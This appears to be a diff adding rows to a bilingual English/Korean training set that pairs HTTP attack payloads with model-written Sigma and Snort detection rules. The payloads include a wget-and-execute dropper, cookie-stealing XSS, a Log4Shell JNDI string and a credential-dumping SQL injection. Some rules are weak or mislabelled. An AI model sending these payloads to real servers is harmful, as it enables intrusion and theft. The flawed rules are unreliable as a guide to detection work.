+Sample Sigma Rule is title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high. As following payload, write it in YAML format in one Sigma Rule.
+","샘플 Sigma Rule은 title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high 이다.
+다음 payload의 해당하는 1개의 Sigma Rule을 YAML 형식으로 작성합니다.","Payload is GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Host: 10.0.0.100
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
+Connection: Keep-Alive.","Payload는 GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Host: 10.0.0.100
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
+Connection: Keep-Alive 이다.",title: detect cross-site scripting (xss) attack in http request description: this rule detects the presence of a cross-site scripting (xss) attack in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - '</title><script'     - 'src=http://'     - 'alert(document.cookie)'   condition: all of them falsepositives:   - legitimate code snippets containing one or more of the keywords in a non-malicious context    - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high,title: detect cross-site scripting (xss) attack in http request description: this rule detects the presence of a cross-site scripting (xss) attack in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - '</title><script'     - 'src=http://'     - 'alert(document.cookie)'   condition: all of them falsepositives:   - legitimate code snippets containing one or more of the keywords in a non-malicious context    - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high
+"
+Sample Sigma Rule is title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high. As following payload, write it in YAML format in one Sigma Rule.
+","샘플 Sigma Rule은 title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high 이다.
+다음 payload의 해당하는 1개의 Sigma Rule을 YAML 형식으로 작성합니다.","Payload is GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9.","Payload는 GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9 이다.",```yaml title: detect command injection in http request description: this rule detects the presence of a command injection attack in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - 'cd+/'     - 'rm+-rf'     - 'wget+http:/'     - 'chmod+777'   condition: keywords falsepositives:   - legitimate administrative actions using similar commands   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high ```,```yaml title: detect command injection in http request description: this rule detects the presence of a command injection attack in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - 'cd+/'     - 'rm+-rf'     - 'wget+http:/'     - 'chmod+777'   condition: keywords falsepositives:   - legitimate administrative actions using similar commands   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high ```
+"
+Sample Sigma Rule is title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high. As following payload, write it in YAML format in one Sigma Rule.
+","샘플 Sigma Rule은 title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high 이다.
+다음 payload의 해당하는 1개의 Sigma Rule을 YAML 형식으로 작성합니다.","Payload is GET /struts/utils.js HTTP/1.1
+Host: 10.10.123.123
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
+X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}}.","Payload는 GET /struts/utils.js HTTP/1.1
+Host: 10.10.123.123
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
+X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}} 이다.",title: detect jndi injection in http request description: this rule detects the presence of a jndi injection attack in http request logs by looking for specific suspicious patterns in the request headers. logsource:   category: webserver   product: httpd detection:   jndi_injection:     pattern:       - '${jndi:ldap://'     headers:       - 'x-client-ip'     condition: pattern in headers falsepositives:   - legitimate use of jndi references in headers   - false matches due to log entries containing one or more of the patterns in a non-malicious context level: high,title: detect jndi injection in http request description: this rule detects the presence of a jndi injection attack in http request logs by looking for specific suspicious patterns in the request headers. logsource:   category: webserver   product: httpd detection:   jndi_injection:     pattern:       - '${jndi:ldap://'     headers:       - 'x-client-ip'     condition: pattern in headers falsepositives:   - legitimate use of jndi references in headers   - false matches due to log entries containing one or more of the patterns in a non-malicious context level: high
+"
+Sample Sigma Rule is title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high. As following payload, write it in YAML format in one Sigma Rule.
+","샘플 Sigma Rule은 title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high 이다.
+다음 payload의 해당하는 1개의 Sigma Rule을 YAML 형식으로 작성합니다.","Payload is GET /phpMyAdmin//iisadminpwd/achg.htr
+/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache.","Payload는 GET /phpMyAdmin//iisadminpwd/achg.htr
+/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache 이다.",title: detect sensitive file access in http request description: this rule detects the presence of an attempt to access sensitive files and directories on the server in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - '/phpmyadmin//iisadminpwd/'     - 'achg.htr'     - '/scripts/setup.php'   user_agent:     - 'mozilla/5.0 (windows nt 6.1; win64; x64) applewebkit/537.36 (khtml like gecko) chrome/172.16.1.12 safari/537.36host: 10.10.123.123'   condition: all of them falsepositives:   - legitimate access to sensitive files and directories   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high,title: detect sensitive file access in http request description: this rule detects the presence of an attempt to access sensitive files and directories on the server in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - '/phpmyadmin//iisadminpwd/'     - 'achg.htr'     - '/scripts/setup.php'   user_agent:     - 'mozilla/5.0 (windows nt 6.1; win64; x64) applewebkit/537.36 (khtml like gecko) chrome/172.16.1.12 safari/537.36host: 10.10.123.123'   condition: all of them falsepositives:   - legitimate access to sensitive files and directories   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high
+"
+Sample Sigma Rule is title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high. As following payload, write it in YAML format in one Sigma Rule.
+","샘플 Sigma Rule은 title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high 이다.
+다음 payload의 해당하는 1개의 Sigma Rule을 YAML 형식으로 작성합니다.","Payload is GET /robots.txt HTTP/1.1
+rw-request-time: 1574036860318
+cdn-ip: 10.10.123.123
+referer: http://admin.corea.school
+x-forwarded-for: 10.10.123.123
+connection: close
+x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
+accept-encoding: gzip
+user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
+accept: */*
+x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
+x-cdn-src-port: 33312
+cdn-src-ip: 10.10.123.123
+host: admin.corea.school.","Payload는 GET /robots.txt HTTP/1.1
+rw-request-time: 1574036860318
+cdn-ip: 10.10.123.123
+referer: http://admin.corea.school
+x-forwarded-for: 10.10.123.123
+connection: close
+x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
+accept-encoding: gzip
+user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
+accept: */*
+x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
+x-cdn-src-port: 33312
+cdn-src-ip: 10.10.123.123
+host: admin.corea.school 이다.",```yaml title: detect unauthorized access to admin page description: this rule detects an attempt to access the admin page of a website in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - 'get /robots.txt http/1.1'     - 'referer: http://admin.corea.school'     - 'user-agent: mozilla/5.0 (compatible; semrushbot/6~bl; +http://test.go.kr/bot.html)'   condition: keywords falsepositives:   - legitimate crawlers accessing website resources   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: medium ```,```yaml title: detect unauthorized access to admin page description: this rule detects an attempt to access the admin page of a website in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - 'get /robots.txt http/1.1'     - 'referer: http://admin.corea.school'     - 'user-agent: mozilla/5.0 (compatible; semrushbot/6~bl; +http://test.go.kr/bot.html)'   condition: keywords falsepositives:   - legitimate crawlers accessing website resources   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: medium ```
+"
+Sample Sigma Rule is title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high. As following payload, write it in YAML format in one Sigma Rule.
+","샘플 Sigma Rule은 title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high 이다.
+다음 payload의 해당하는 1개의 Sigma Rule을 YAML 형식으로 작성합니다.","Payload is GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
+Accept: text/html application/xhtml+xml image/jxr */*
+Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
+Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
+Host: owa.corea.school
+Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3.","Payload는 GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
+Accept: text/html application/xhtml+xml image/jxr */*
+Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
+Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
+Host: owa.corea.school
+Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3 이다.","title: detect unauthorized wordpress admin access description: this rule detects unauthorized attempts to access the wordpress admin page, specifically targeting wordpress vulnerabilities, by looking for specific patterns in the http request. logsource:   category: webserver   product: httpd detection:   keywords:     - 'get /wp-login.php?redirect_to'     - 'wp-config'   referer_key:     - '10.10.123.123'   condition: (keywords) and (referer_key) falsepositives:   - legitimate administrative actions accessing the wordpress admin page   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high","title: detect unauthorized wordpress admin access description: this rule detects unauthorized attempts to access the wordpress admin page, specifically targeting wordpress vulnerabilities, by looking for specific patterns in the http request. logsource:   category: webserver   product: httpd detection:   keywords:     - 'get /wp-login.php?redirect_to'     - 'wp-config'   referer_key:     - '10.10.123.123'   condition: (keywords) and (referer_key) falsepositives:   - legitimate administrative actions accessing the wordpress admin page   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high"
+"
+Sample Snort Rule is alert tcp any any -> any 80 (content:""GET""; nocase; http_method; content:""/admin.php""; nocase; http_uri; msg:""Possible web application attack""; sid:100001; rev:1;)
+. In the case of the input payload, write only one Snort Rule that can be detected, starting with alert and ending with rev:1;).
+","샘플 Snort Rule은 alert tcp any any -> any 80 (content:""""GET""""; nocase; http_method; content:""""/admin.php""""; nocase; http_uri; msg:""""Possible web application attack""""; sid:100001; rev:1;) 이다.
+다음 payload의 경우 alert로 시작하여 rev:1;)로 끝나는 탐지 가능한 Snort Rule을 1개만 작성하십시오.","Payload is GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+Host: www.test.go.kr
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None).","Payload는 GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+Host: www.test.go.kr
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) 이다.","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/jenkins/postnuke/index.php""; nocase; http_uri; content:""union""; nocase; content:""select""; nocase; content:""concat""; nocase; content:""from""; nocase; content:""where""; nocase; msg:""possible sql injection attack detected""; sid:100002; rev:1;)","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/jenkins/postnuke/index.php""; nocase; http_uri; content:""union""; nocase; content:""select""; nocase; content:""concat""; nocase; content:""from""; nocase; content:""where""; nocase; msg:""possible sql injection attack detected""; sid:100002; rev:1;)"
+"
+Sample Snort Rule is alert tcp any any -> any 80 (content:""GET""; nocase; http_method; content:""/admin.php""; nocase; http_uri; msg:""Possible web application attack""; sid:100001; rev:1;)
+. In the case of the input payload, write only one Snort Rule that can be detected, starting with alert and ending with rev:1;).
+","샘플 Snort Rule은 alert tcp any any -> any 80 (content:""""GET""""; nocase; http_method; content:""""/admin.php""""; nocase; http_uri; msg:""""Possible web application attack""""; sid:100001; rev:1;) 이다.
+다음 payload의 경우 alert로 시작하여 rev:1;)로 끝나는 탐지 가능한 Snort Rule을 1개만 작성하십시오.","Payload is GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Host: 10.0.0.100
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
+Connection: Keep-Alive.","Payload는 GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Host: 10.0.0.100
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
+Connection: Keep-Alive 이다.","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/themes/mambosimple.php""; nocase; http_uri; content:""<script""; nocase; http_client_body; content:""</script>""; nocase; http_client_body; msg:""possible xss attack detected""; sid:100002; rev:1;)","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/themes/mambosimple.php""; nocase; http_uri; content:""<script""; nocase; http_client_body; content:""</script>""; nocase; http_client_body; msg:""possible xss attack detected""; sid:100002; rev:1;)"
+"
+Sample Snort Rule is alert tcp any any -> any 80 (content:""GET""; nocase; http_method; content:""/admin.php""; nocase; http_uri; msg:""Possible web application attack""; sid:100001; rev:1;)
+. In the case of the input payload, write only one Snort Rule that can be detected, starting with alert and ending with rev:1;).
+","샘플 Snort Rule은 alert tcp any any -> any 80 (content:""""GET""""; nocase; http_method; content:""""/admin.php""""; nocase; http_uri; msg:""""Possible web application attack""""; sid:100001; rev:1;) 이다.
+다음 payload의 경우 alert로 시작하여 rev:1;)로 끝나는 탐지 가능한 Snort Rule을 1개만 작성하십시오.","Payload is GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9.","Payload는 GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9 이다.","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/shell?cd""; nocase; http_uri; content:""wget+http""; nocase; http_uri; content:""chmod+777""; nocase; http_uri; content:""./am7+jaws""; nocase; http_uri; msg:""possible command injection attack detected""; sid:100002; rev:1;)","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/shell?cd""; nocase; http_uri; content:""wget+http""; nocase; http_uri; content:""chmod+777""; nocase; http_uri; content:""./am7+jaws""; nocase; http_uri; msg:""possible command injection attack detected""; sid:100002; rev:1;)"
+"
+Sample Snort Rule is alert tcp any any -> any 80 (content:""GET""; nocase; http_method; content:""/admin.php""; nocase; http_uri; msg:""Possible web application attack""; sid:100001; rev:1;)
+. In the case of the input payload, write only one Snort Rule that can be detected, starting with alert and ending with rev:1;).
+","샘플 Snort Rule은 alert tcp any any -> any 80 (content:""""GET""""; nocase; http_method; content:""""/admin.php""""; nocase; http_uri; msg:""""Possible web application attack""""; sid:100001; rev:1;) 이다.
+다음 payload의 경우 alert로 시작하여 rev:1;)로 끝나는 탐지 가능한 Snort Rule을 1개만 작성하십시오.","Payload is GET /struts/utils.js HTTP/1.1
+Host: 10.10.123.123
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
+X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}}.","Payload는 GET /struts/utils.js HTTP/1.1
+Host: 10.10.123.123
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
+X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}} 이다.","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/struts/utils.js""; nocase; http_uri; content:""${jndi:ldap://""; nocase; http_header; msg:""possible jndi injection attack""; sid:100002; rev:1;)","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/struts/utils.js""; nocase; http_uri; content:""${jndi:ldap://""; nocase; http_header; msg:""possible jndi injection attack""; sid:100002; rev:1;)"
+"
+Sample Snort Rule is alert tcp any any -> any 80 (content:""GET""; nocase; http_method; content:""/admin.php""; nocase; http_uri; msg:""Possible web application attack""; sid:100001; rev:1;)
+. In the case of the input payload, write only one Snort Rule that can be detected, starting with alert and ending with rev:1;).
+","샘플 Snort Rule은 alert tcp any any -> any 80 (content:""""GET""""; nocase; http_method; content:""""/admin.php""""; nocase; http_uri; msg:""""Possible web application attack""""; sid:100001; rev:1;) 이다.
+다음 payload의 경우 alert로 시작하여 rev:1;)로 끝나는 탐지 가능한 Snort Rule을 1개만 작성하십시오.","Payload is GET /phpMyAdmin//iisadminpwd/achg.htr
+/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache.","Payload는 GET /phpMyAdmin//iisadminpwd/achg.htr
+/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache 이다.","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/phpmyadmin//iisadminpwd/achg.htr/scripts/setup.php""; nocase; http_uri; msg:""possible web application attack""; sid:100002; rev:1;)","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/phpmyadmin//iisadminpwd/achg.htr/scripts/setup.php""; nocase; http_uri; msg:""possible web application attack""; sid:100002; rev:1;)"
+"
+Sample Snort Rule is alert tcp any any -> any 80 (content:""GET""; nocase; http_method; content:""/admin.php""; nocase; http_uri; msg:""Possible web application attack""; sid:100001; rev:1;)
+. In the case of the input payload, write only one Snort Rule that can be detected, starting with alert and ending with rev:1;).
+","샘플 Snort Rule은 alert tcp any any -> any 80 (content:""""GET""""; nocase; http_method; content:""""/admin.php""""; nocase; http_uri; msg:""""Possible web application attack""""; sid:100001; rev:1;) 이다.
+다음 payload의 경우 alert로 시작하여 rev:1;)로 끝나는 탐지 가능한 Snort Rule을 1개만 작성하십시오.","Payload is GET /robots.txt HTTP/1.1
+rw-request-time: 1574036860318
+cdn-ip: 10.10.123.123
+referer: http://admin.corea.school
+x-forwarded-for: 10.10.123.123
+connection: close
+x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
+accept-encoding: gzip
+user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
+accept: */*
+x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
+x-cdn-src-port: 33312
+cdn-src-ip: 10.10.123.123
+host: admin.corea.school.","Payload는 GET /robots.txt HTTP/1.1
+rw-request-time: 1574036860318
+cdn-ip: 10.10.123.123
+referer: http://admin.corea.school
+x-forwarded-for: 10.10.123.123
+connection: close
+x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
+accept-encoding: gzip
+user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
+accept: */*
+x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
+x-cdn-src-port: 33312
+cdn-src-ip: 10.10.123.123
+host: admin.corea.school 이다.","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/robots.txt""; nocase; http_uri; content:""admin.corea.school""; nocase; http_header; msg:""possible unauthorized access to admin page""; sid:100002; rev:1;)","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/robots.txt""; nocase; http_uri; content:""admin.corea.school""; nocase; http_header; msg:""possible unauthorized access to admin page""; sid:100002; rev:1;)"
+"
+Sample Snort Rule is alert tcp any any -> any 80 (content:""GET""; nocase; http_method; content:""/admin.php""; nocase; http_uri; msg:""Possible web application attack""; sid:100001; rev:1;)
+. In the case of the input payload, write only one Snort Rule that can be detected, starting with alert and ending with rev:1;).
+","샘플 Snort Rule은 alert tcp any any -> any 80 (content:""""GET""""; nocase; http_method; content:""""/admin.php""""; nocase; http_uri; msg:""""Possible web application attack""""; sid:100001; rev:1;) 이다.
+다음 payload의 경우 alert로 시작하여 rev:1;)로 끝나는 탐지 가능한 Snort Rule을 1개만 작성하십시오.","Payload is GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
+Accept: text/html application/xhtml+xml image/jxr */*
+Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
+Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
+Host: owa.corea.school
+Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3.","Payload는 GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
+Accept: text/html application/xhtml+xml image/jxr */*
+Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
+Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
+Host: owa.corea.school
+Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3 이다.","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/wp-login.php""; nocase; http_uri; content:""redirect_to=""; nocase; http_uri; content:"".school%2fwp-config%2f""; nocase; http_uri; msg:""possible wordpress admin access attempt""; sid:100002; rev:1;)","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/wp-login.php""; nocase; http_uri; content:""redirect_to=""; nocase; http_uri; content:"".school%2fwp-config%2f""; nocase; http_uri; msg:""possible wordpress admin access attempt""; sid:100002; rev:1;)"
+"
